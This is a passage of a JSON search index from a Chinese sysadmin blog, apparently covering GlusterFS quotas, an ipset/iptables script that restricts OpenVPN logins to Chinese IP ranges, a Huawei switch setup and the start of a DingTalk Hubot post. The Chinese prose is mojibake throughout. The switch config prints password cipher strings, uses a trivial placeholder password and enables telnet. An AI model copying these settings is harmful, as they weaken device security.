test-zhichi-vol \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-zhichi-vol limit-usage / 50GB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egluster volume quota test-zhichi-vol list\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"é™åˆ¶ipè®¿é—®\"\u003eé™åˆ¶IPè®¿é—®\u003c/h4\u003e\n\u003cp\u003eä¾‹å¦‚å…è®¸172.18.31.*ç½‘æ®µçš„ä¸»æœºè®¿é—®rep-volumeï¼š\u003c/p\u003e","title":"GlusterFSçš„å®é™…åº”ç”¨"},{"content":"çªç„¶æ¥çš„ä¸ªéœ€æ±‚ï¼Œè¦æ±‚å±è”½å›½å¤–çš„ç”¨æˆ·ç™»å½•å…¬å¸çš„openvpnï¼Œé˜²æ­¢æ»¥ç”¨ï¼Œæœäº†ä¸€ä¸‹æ•™ç¨‹å€’æ˜¯çœŸä¸å°‘ï¼Œé—®é¢˜ä¸å°‘éƒ½æ˜¯è¦å»ä¸‹è½½é‚£ä¸ªæ— æ¯”å¤§çš„ipåœ°å€åº“ï¼Œå¥½ä¸å®¹æ˜“æ‰¾äº†ä¸€ä¸ªå¯ç”¨çš„ã€‚\nè®°å½•ä¸‹æ¥ï¼Œå¤‡ç”¨ï¼ŒåŸç†å¾ˆç®€å•ï¼Œipsetå»ºç«‹ä¸€ä¸ªchinaçš„hashsetï¼Œä¸åœæ·»åŠ æ¡ç›®ï¼Œæœ€åç”¨iptalbesé˜»æŒ¡ä¸€ä¸‹ï¼š\n#!/bin/sh ipset create china hash:net hashsize 10000 maxelem 1000000 ipset add china 1.0.1.0/24 ...... ipset add china 91.234.36.0/24 iptables -I INPUT -m set --match-set china src -p udp -m udp --dport 1194 -j ACCEPT iptables -A INPUT -p udp --dport 1194 -j DROP ç›¸åº”è„šæœ¬çš„ä¸‹è½½ï¼š\nipset-rules.txt\n","permalink":"https://rendoumi.com/posts/20230329-ipset_block/","summary":"\u003cp\u003eçªç„¶æ¥çš„ä¸ªéœ€æ±‚ï¼Œè¦æ±‚å±è”½å›½å¤–çš„ç”¨æˆ·ç™»å½•å…¬å¸çš„openvpnï¼Œé˜²æ­¢æ»¥ç”¨ï¼Œæœäº†ä¸€ä¸‹æ•™ç¨‹å€’æ˜¯çœŸä¸å°‘ï¼Œé—®é¢˜ä¸å°‘éƒ½æ˜¯è¦å»ä¸‹è½½é‚£ä¸ªæ— æ¯”å¤§çš„ipåœ°å€åº“ï¼Œå¥½ä¸å®¹æ˜“æ‰¾äº†ä¸€ä¸ªå¯ç”¨çš„ã€‚\u003c/p\u003e\n\u003cp\u003eè®°å½•ä¸‹æ¥ï¼Œå¤‡ç”¨ï¼ŒåŸç†å¾ˆç®€å•ï¼Œipsetå»ºç«‹ä¸€ä¸ªchinaçš„hashsetï¼Œä¸åœæ·»åŠ æ¡ç›®ï¼Œæœ€åç”¨iptalbesé˜»æŒ¡ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003eipset create china hash:net hashsize \u003cspan class=\"m\"\u003e10000\u003c/span\u003e maxelem \u003cspan class=\"m\"\u003e1000000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipset add china 1.0.1.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipset add china 91.234.36.0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -I INPUT -m \u003cspan class=\"nb\"\u003eset\u003c/span\u003e --match-set china src -p udp -m udp --dport \u003cspan class=\"m\"\u003e1194\u003c/span\u003e -j ACCEPT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eiptables -A INPUT -p udp --dport \u003cspan class=\"m\"\u003e1194\u003c/span\u003e -j DROP\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç›¸åº”è„šæœ¬çš„ä¸‹è½½ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"ipset-rules.txt\"\u003eipset-rules.txt\u003c/a\u003e\u003c/p\u003e","title":"ä½¿ç”¨ipsetæ¥ç¦æ­¢å›½å¤–çš„ç”¨æˆ·ç™»å½•openvpn"},{"content":"æ¢äº†å…¬å¸ï¼Œä¹Ÿæèµ·äº†æ¡Œé¢è¿ç»´ï¼Œé…ç½®äº¤æ¢æœºçš„è¿‡ç¨‹è®°å½•ä¸€ä¸‹ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯å‘½ä»¤è®°ä¸ä½ã€‚\næ‹¿åˆ°ä¸€å°åä¸ºäº¤æ¢æœºï¼Œé‡æ–°åˆå§‹åŒ–åï¼Œé…ç½®å¦‚ä¸‹ï¼š\n\u0026lt;HUAWEI\u0026gt;dis cur !Software Version V200R008C00SPC500 # sysname HUAWEI # aaa authentication-scheme default authorization-scheme default accounting-scheme default domain default domain default_admin local-user admin password irreversible-cipher %^%#7:.iL]+u\u0026#34;4\\j8ZFhGeg/-m.\u0026amp;\u0026#34;^0}kMznjk%\u0026gt;;BaUDO/\u0026#39;6m\\X\\=V8JGY:W;i,%^%# local-user admin service-type http # interface Vlanif1 # interface MEth0/0/1 # interface GigabitEthernet0/0/1 # interface NULL0 # user-interface con 0 authentication-mode password set authentication password cipher $1a$~!;$-JF0-W$Z\u0026gt;\u0026lt;1.F]\u0026lt;sF.R_NBj34CJ/JPe=/tZDMM(Ws3\u0026#39;9u%+$ user-interface vty 0 4 user-interface vty 16 20 # return ä¸€ã€é…åç§° sysname BJ_FANGHENG_JIERU äºŒã€é…ç½®ç™»å½•ç”¨æˆ· 1ã€aaa local-user admin password irreversible-cipher abcdefg local-user admin privilege level 3 local-user admin service-type telnet terminal ssh 2ã€user-interface con 0 authentication-mode aaa 3ã€user-interface vty 0 4 authentication-mode aaa protocol inbound all ä¸‰ã€é…ç½®ä¸‹è”äº¤æ¢æœºç«¯å£ interface GigabitEthernet0/0/23 description == H3cSW --\u0026gt; 24 port link-type trunk port trunk allow-pass vlan 2 to 4094 å››ã€é…ç½®ä¸Šè”äº¤æ¢æœºç«¯å£ interface GigabitEthernet0/0/24 description == RuijieRoute --\u0026gt; lan0 port link-type trunk port trunk allow-pass vlan 2 to 4094 äº”ã€é…ç½®vlanåœ°å€ vlan 11 vlan 100 vlan 11 interface Vlanif11 ip address 10.8.0.7 255.255.254.0 vlan 100 interface Vlanif100 ip address 192.168.10.7 255.255.255.0 å…­ã€é…ç½®ç¼ºçœè·¯ç”± ip route-static 0.0.0.0 0.0.0.0 10.8.0.1 ä¸ƒã€æ‰¹é‡é…ç½®ç«¯å£ port-group group-member GigabitEthernet0/0/1 to GigabitEthernet0/0/23 port link-type access port default vlan 11 stp edged-port enable å…«ã€lldp lldp enable ä¹ã€dhcp dhcp enable ip pool 11 gateway-list 10.8.0.1 network 10.8.0.0 mask 255.255.254.0 static-bind ip-address 10.8.0.4 mac-address 8005-88f1-fa62 dns-list 114.114.114.114 interface Vlanif11 description === Ke hu duan ip address 10.8.0.1 255.255.254.0 dhcp select global åã€telnetå’Œssh dsa local-key-pair create telnet server enable stelnet server enable ssh authentication-type default password è¿™æ ·å°±å®Œæˆäº†ä¸€å°æ ¸å¿ƒè®¾å¤‡çš„ç®€å•é…ç½®\n","permalink":"https://rendoumi.com/posts/20230324-huawei_switch/","summary":"\u003cp\u003eæ¢äº†å…¬å¸ï¼Œä¹Ÿæèµ·äº†æ¡Œé¢è¿ç»´ï¼Œé…ç½®äº¤æ¢æœºçš„è¿‡ç¨‹è®°å½•ä¸€ä¸‹ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯å‘½ä»¤è®°ä¸ä½ã€‚\u003c/p\u003e\n\u003cp\u003eæ‹¿åˆ°ä¸€å°åä¸ºäº¤æ¢æœºï¼Œé‡æ–°åˆå§‹åŒ–åï¼Œé…ç½®å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;HUAWEI\u0026gt;dis cur\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e!Software Version V200R008C00SPC500\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysname HUAWEI\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e authentication-scheme default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e authorization-scheme default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e accounting-scheme default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e domain default\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e domain default_admin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e local-user admin password irreversible-cipher %^%#7:.iL\u003cspan class=\"o\"\u003e]\u003c/span\u003e+u\u003cspan class=\"s2\"\u003e\u0026#34;4\\j8ZFhGeg/-m.\u0026amp;\u0026#34;\u003c/span\u003e^0\u003cspan class=\"o\"\u003e}\u003c/span\u003ekMznjk%\u0026gt;\u003cspan class=\"p\"\u003e;\u003c/span\u003eBaUDO/\u003cspan class=\"s1\"\u003e\u0026#39;6m\\X\\=V8JGY:W;i,%^%#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e local-user admin service-type http\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einterface Vlanif1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einterface MEth0/0/1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einterface GigabitEthernet0/0/1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#                                         \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003einterface NULL0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e#\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003euser-interface con 0\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e authentication-mode password\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e set authentication password cipher $1a$~!;$-JF0-W$Z\u0026gt;\u0026lt;1.F]\u0026lt;sF.R_NBj34CJ/JPe=/tZDMM(Ws3\u0026#39;\u003c/span\u003e9u%+$\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser-interface vty \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euser-interface vty \u003cspan class=\"m\"\u003e16\u003c/span\u003e \u003cspan class=\"m\"\u003e20\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¸€é…åç§°\"\u003eä¸€ã€é…åç§°\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysname BJ_FANGHENG_JIERU\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"äºŒé…ç½®ç™»å½•ç”¨æˆ·\"\u003eäºŒã€é…ç½®ç™»å½•ç”¨æˆ·\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e1ã€aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal-user admin password irreversible-cipher abcdefg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal-user admin privilege level \u003cspan class=\"m\"\u003e3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocal-user admin service-type telnet terminal ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2ã€user-interface con \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauthentication-mode aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3ã€user-interface vty \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"m\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauthentication-mode aaa\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprotocol inbound all\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¸‰é…ç½®ä¸‹è”äº¤æ¢æœºç«¯å£\"\u003eä¸‰ã€é…ç½®ä¸‹è”äº¤æ¢æœºç«¯å£\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einterface GigabitEthernet0/0/23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003edescription\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e H3cSW --\u0026gt; \u003cspan class=\"m\"\u003e24\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e port link-type trunk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e port trunk allow-pass vlan \u003cspan class=\"m\"\u003e2\u003c/span\u003e to \u003cspan class=\"m\"\u003e4094\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"å››é…ç½®ä¸Šè”äº¤æ¢æœºç«¯å£\"\u003eå››ã€é…ç½®ä¸Šè”äº¤æ¢æœºç«¯å£\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einterface GigabitEthernet0/0/24\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003edescription\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e RuijieRoute --\u0026gt; lan0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e port link-type trunk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e port trunk allow-pass vlan \u003cspan class=\"m\"\u003e2\u003c/span\u003e to \u003cspan class=\"m\"\u003e4094\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"äº”é…ç½®vlanåœ°å€\"\u003eäº”ã€é…ç½®vlanåœ°å€\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evlan \u003cspan class=\"m\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evlan \u003cspan class=\"m\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evlan \u003cspan class=\"m\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e interface Vlanif11\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ip address 10.8.0.7 255.255.254.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evlan \u003cspan class=\"m\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e interface Vlanif100\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ip address 192.168.10.7 255.255.255.0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"å…­é…ç½®ç¼ºçœè·¯ç”±\"\u003eå…­ã€é…ç½®ç¼ºçœè·¯ç”±\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip route-static 0.0.0.0 0.0.0.0 10.8.0.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¸ƒæ‰¹é‡é…ç½®ç«¯å£\"\u003eä¸ƒã€æ‰¹é‡é…ç½®ç«¯å£\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eport-group group-member GigabitEthernet0/0/1 to GigabitEthernet0/0/23\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eport link-type access\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eport default vlan \u003cspan class=\"m\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estp edged-port \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"å…«lldp\"\u003eå…«ã€lldp\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elldp \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"ä¹dhcp\"\u003eä¹ã€dhcp\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edhcp \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eip pool \u003cspan class=\"m\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e gateway-list 10.8.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e network 10.8.0.0 mask 255.255.254.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e static-bind ip-address 10.8.0.4 mac-address 8005-88f1-fa62\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e dns-list 114.114.114.114\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einterface Vlanif11\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003edescription\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e Ke hu duan\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e ip address 10.8.0.1 255.255.254.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e dhcp \u003cspan class=\"k\"\u003eselect\u003c/span\u003e global\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"åtelnetå’Œssh\"\u003eåã€telnetå’Œssh\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edsa local-key-pair create\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etelnet server \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estelnet server \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003essh authentication-type default password\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±å®Œæˆäº†ä¸€å°æ ¸å¿ƒè®¾å¤‡çš„ç®€å•é…ç½®\u003c/p\u003e","title":"æ ¸å¿ƒäº¤æ¢æœºçš„é…ç½®è¿‡ç¨‹"},{"content":"æ¢äº†å…¬å¸ï¼Œç°åœ¨çš„å…¬å¸ç”¨çš„æ˜¯é’‰é’‰ï¼Œä¸æ˜¯ä¼ä¸šå¾®ä¿¡ï¼Œé‚£ä¹ˆ hubot å°±å¾—æ”¹æ¥å…¥é’‰é’‰äº†\nå‰æ–‡å›é¡¾ï¼šHuboté›†æˆä¼ä¸šå¾®ä¿¡+jenkins+ansible\nä¸æ˜ç™½çš„å¯ä»¥å…ˆçœ‹é‚£ä¸€ç¯‡ï¼Œé‚£ä¹ˆé¦–å…ˆçš„æ­¥éª¤æ˜¯ä¸€æ ·çš„ï¼ŒåŒæ ·è¦å»é’‰é’‰å¼€æ”¾å¹³å°ï¼Œç”¨ç®¡ç†å‘˜ç™»å½•ï¼š\nhttps://open.dingtalk.com/\nç™»é™†åï¼Œç‚¹å‡»åº”ç”¨å¼€å‘\u0026ndash;\u0026gt;ä¼ä¸šåº”ç”¨å¼€å‘ï¼š\nâ€™\nç„¶ååº”ç”¨å¼€å‘ï¼Œæœºå™¨äººï¼Œç‚¹å‡»åˆ›å»ºåº”ç”¨ï¼š\nå»ºå¥½åï¼Œç‚¹å‡»åº”ç”¨ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨å‡­è¯\næˆ‘ä»¬è®°å½•ä¸‹æ¥ AppSecretï¼Œä¹‹åè¦ç”¨åˆ°\nç„¶åå†ç‚¹å‡»å¼€å‘ç®¡ç†ï¼Œè¿™é‡Œéœ€è¦ä½ æŠŠ hubot çš„æœåŠ¡å™¨åœ°å€ç»™å…¬å¸ƒå‡ºå»ï¼Œéœ€è¦æœ‰ä¸ªå…¬ç½‘åœ°å€\nå› ä¸ºhubotæ˜¯ç›‘å¬çš„8080ç«¯å£ï¼Œæ‰€ä»¥æ˜ å°„æ˜¯ xxxx.ip:80 \u0026ndash;\u0026gt; hubotip:8080\næœåŠ¡å™¨å‡ºå£ IP çš„åœ°æ–¹ , éœ€è¦åœ¨ hubot çš„æœåŠ¡å™¨ä¸Šï¼Œcurl http://ipinfo.ioï¼Œå¾—åˆ°åœ°å€ï¼Œç„¶åå¡«ä¸Šï¼ˆæˆ‘ä»¬çš„ ip éå¸¸ç‰¹æ®Šï¼Œæ¯ä¸€æ¬¡è®¿é—®éƒ½æœ‰å¯èƒ½ä¼šæ¢ä¸ªipï¼Œæ‰€ä»¥åªå¥½æŠŠæ•´æ®µå¡«å†™è¿›å»ï¼Œè€Œä¸”æŠŠå…¬ç½‘æ˜ å°„ipä¹Ÿå¡«è¿›å»ï¼‰\næ¶ˆæ¯æ¥æ”¶åœ°å€å¡«ä¸Šæ˜ 